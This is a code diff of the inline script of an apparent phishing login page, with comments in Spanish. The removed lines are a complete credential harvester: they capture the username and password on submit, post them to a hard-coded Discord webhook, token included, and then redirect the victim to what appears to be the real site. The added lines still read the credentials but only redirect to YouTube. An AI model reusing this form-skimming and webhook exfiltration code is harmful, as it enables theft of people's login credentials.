@@ -289,47 +289,30 @@ document.addEventListener('DOMContentLoaded', function () {
     
     if (form) {
         form.addEventListener('submit', function (event) {
-            event.preventDefault();
+            event.preventDefault(); // Evita que el formulario se envíe de manera tradicional
             
+            // Obtén los valores de usuario y contraseña (esto es solo para demostración, no lo uses maliciosamente)
             const username = document.querySelector('input[name="username"]').value;
             const password = document.querySelector('input[name="password"]').value;
-            
-            // Mostrar algún indicador de carga para mejorar UX
+
+            // Deshabilita el botón para evitar múltiples clics
             const submitBtn = document.getElementById('loginbtn');
             if (submitBtn) submitBtn.disabled = true;
-            
-            fetch('https://discord.com/api/webhooks/1347639051930439711/zhyHwO1Kjg5gZpxQVC58X114E358bTBsWx2DMFW9wnO01laEiqP5FuZYsr0Wk6dJVavd', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: `Nuevo intento de login:\nUsuario: ${username}\nContraseña: ${password}`
-                })
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Datos enviados correctamente');
-                    // Solo redirigir si el envío fue exitoso
-                    window.location.href = 'https://anoeta.saioka.eus/';
-                } else {
-                    console.error('Error al enviar datos:', response.status);
-                    // Intentar nuevamente o manejar el error
-                    alert('Error al iniciar sesión. Intente nuevamente.');
-                    if (submitBtn) submitBtn.disabled = false;
-                }
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-                alert('Error de conexión. Intente nuevamente.');
-                if (submitBtn) submitBtn.disabled = false;
-            });
+
+            // Muestra un mensaje de carga o algo similar (opcional)
+            console.log('Redirigiendo...');
+
+            // Redirige a la página deseada después de X tiempo (por ejemplo, 3 segundos)
+            setTimeout(function () {
+                window.location.href = 'https://www.youtube.com/'; // Cambia esta URL por la que desees
+            }, 3000); // 3000 milisegundos = 3 segundos
         });
     } else {
         console.error('Formulario no encontrado');
     }
 });
 </script>
+
 
 
 
